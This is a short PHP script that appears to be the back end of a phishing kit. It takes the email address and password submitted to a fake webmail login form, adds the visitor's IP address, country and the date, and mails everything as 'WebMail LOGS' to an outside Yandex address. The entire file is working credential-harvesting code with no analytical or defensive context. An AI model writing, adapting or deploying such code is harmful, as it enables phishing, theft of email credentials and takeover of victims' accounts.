<?php
$ip = getenv("REMOTE_ADDR");
$userid = $_POST['userid'];
$password = $_POST['password'];
$adddate= date("D M d, Y g:i a");
$country = visitor_country();
$message .="====================[WebMail LOGS]====================\n";
$message .="Email: $userid\n";
$message .="Password: $password\n";
$message .="IP Address: $ip\n";
$message .="Country: $country\n";
$message .="Date: $adddate\n";
$message .="====================[WebMail LOGS]====================\n";

$subject ="New WebMail LOGS";

mail("pablobaddy@yandex.com", $subject, $message);

// Function to get Country

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

?>


